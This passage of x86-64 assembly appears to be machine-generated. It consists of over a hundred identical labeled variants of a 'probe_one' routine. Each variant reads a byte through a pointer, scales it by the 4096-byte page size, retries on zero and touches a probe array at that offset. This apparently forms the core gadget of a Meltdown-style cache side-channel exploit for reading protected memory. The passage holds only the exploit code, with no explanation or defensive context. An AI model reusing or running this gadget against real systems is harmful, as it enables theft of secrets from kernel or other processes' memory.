	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 572
.Lprobe_one_win0_var572:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 573
.Lprobe_one_win0_var573:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 574
.Lprobe_one_win0_var574:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 575
.Lprobe_one_win0_var575:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 576
.Lprobe_one_win0_var576:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 577
.Lprobe_one_win0_var577:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 578
.Lprobe_one_win0_var578:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 579
.Lprobe_one_win0_var579:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 580
.Lprobe_one_win0_var580:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 581
.Lprobe_one_win0_var581:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 582
.Lprobe_one_win0_var582:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 583
.Lprobe_one_win0_var583:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 584
.Lprobe_one_win0_var584:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 585
.Lprobe_one_win0_var585:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 586
.Lprobe_one_win0_var586:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 587
.Lprobe_one_win0_var587:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 588
.Lprobe_one_win0_var588:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 589
.Lprobe_one_win0_var589:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 590
.Lprobe_one_win0_var590:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 591
.Lprobe_one_win0_var591:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 592
.Lprobe_one_win0_var592:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 593
.Lprobe_one_win0_var593:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 594
.Lprobe_one_win0_var594:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 595
.Lprobe_one_win0_var595:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 596
.Lprobe_one_win0_var596:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 597
.Lprobe_one_win0_var597:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 598
.Lprobe_one_win0_var598:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 599
.Lprobe_one_win0_var599:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 600
.Lprobe_one_win0_var600:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 601
.Lprobe_one_win0_var601:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 602
.Lprobe_one_win0_var602:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 603
.Lprobe_one_win0_var603:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 604
.Lprobe_one_win0_var604:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 605
.Lprobe_one_win0_var605:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 606
.Lprobe_one_win0_var606:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 607
.Lprobe_one_win0_var607:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 608
.Lprobe_one_win0_var608:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 609
.Lprobe_one_win0_var609:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 610
.Lprobe_one_win0_var610:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 611
.Lprobe_one_win0_var611:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 612
.Lprobe_one_win0_var612:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 613
.Lprobe_one_win0_var613:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 614
.Lprobe_one_win0_var614:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 615
.Lprobe_one_win0_var615:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 616
.Lprobe_one_win0_var616:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 617
.Lprobe_one_win0_var617:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 618
.Lprobe_one_win0_var618:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 619
.Lprobe_one_win0_var619:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 620
.Lprobe_one_win0_var620:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 621
.Lprobe_one_win0_var621:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 622
.Lprobe_one_win0_var622:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 623
.Lprobe_one_win0_var623:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 624
.Lprobe_one_win0_var624:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 625
.Lprobe_one_win0_var625:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 626
.Lprobe_one_win0_var626:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 627
.Lprobe_one_win0_var627:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 628
.Lprobe_one_win0_var628:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 629
.Lprobe_one_win0_var629:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 630
.Lprobe_one_win0_var630:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 631
.Lprobe_one_win0_var631:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 632
.Lprobe_one_win0_var632:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 633
.Lprobe_one_win0_var633:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 634
.Lprobe_one_win0_var634:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 635
.Lprobe_one_win0_var635:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 636
.Lprobe_one_win0_var636:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 637
.Lprobe_one_win0_var637:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 638
.Lprobe_one_win0_var638:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 639
.Lprobe_one_win0_var639:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 640
.Lprobe_one_win0_var640:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 641
.Lprobe_one_win0_var641:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 642
.Lprobe_one_win0_var642:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 643
.Lprobe_one_win0_var643:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 644
.Lprobe_one_win0_var644:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 645
.Lprobe_one_win0_var645:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 646
.Lprobe_one_win0_var646:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 647
.Lprobe_one_win0_var647:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 648
.Lprobe_one_win0_var648:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 649
.Lprobe_one_win0_var649:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 650
.Lprobe_one_win0_var650:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 651
.Lprobe_one_win0_var651:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 652
.Lprobe_one_win0_var652:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 653
.Lprobe_one_win0_var653:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 654
.Lprobe_one_win0_var654:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 655
.Lprobe_one_win0_var655:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 656
.Lprobe_one_win0_var656:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 657
.Lprobe_one_win0_var657:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 658
.Lprobe_one_win0_var658:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 659
.Lprobe_one_win0_var659:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 660
.Lprobe_one_win0_var660:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 661
.Lprobe_one_win0_var661:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 662
.Lprobe_one_win0_var662:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 663
.Lprobe_one_win0_var663:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 664
.Lprobe_one_win0_var664:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 665
.Lprobe_one_win0_var665:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 666
.Lprobe_one_win0_var666:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 667
.Lprobe_one_win0_var667:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 668
.Lprobe_one_win0_var668:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 669
.Lprobe_one_win0_var669:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 670
.Lprobe_one_win0_var670:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 671
.Lprobe_one_win0_var671:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 672
.Lprobe_one_win0_var672:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 673
.Lprobe_one_win0_var673:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 674
.Lprobe_one_win0_var674:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 675
.Lprobe_one_win0_var675:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 676
.Lprobe_one_win0_var676:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 677
.Lprobe_one_win0_var677:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 678
.Lprobe_one_win0_var678:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 679
.Lprobe_one_win0_var679:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 680
.Lprobe_one_win0_var680:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 681
.Lprobe_one_win0_var681:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 682
.Lprobe_one_win0_var682:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 683
.Lprobe_one_win0_var683:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 684
.Lprobe_one_win0_var684:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 685
.Lprobe_one_win0_var685:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 686
.Lprobe_one_win0_var686:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 687
.Lprobe_one_win0_var687:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 688
.Lprobe_one_win0_var688:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 689
.Lprobe_one_win0_var689:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 690
.Lprobe_one_win0_var690:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 691
.Lprobe_one_win0_var691:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 692
.Lprobe_one_win0_var692:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 693
.Lprobe_one_win0_var693:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 694
.Lprobe_one_win0_var694:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 695
.Lprobe_one_win0_var695:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 696
.Lprobe_one_win0_var696:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 697
.Lprobe_one_win0_var697:
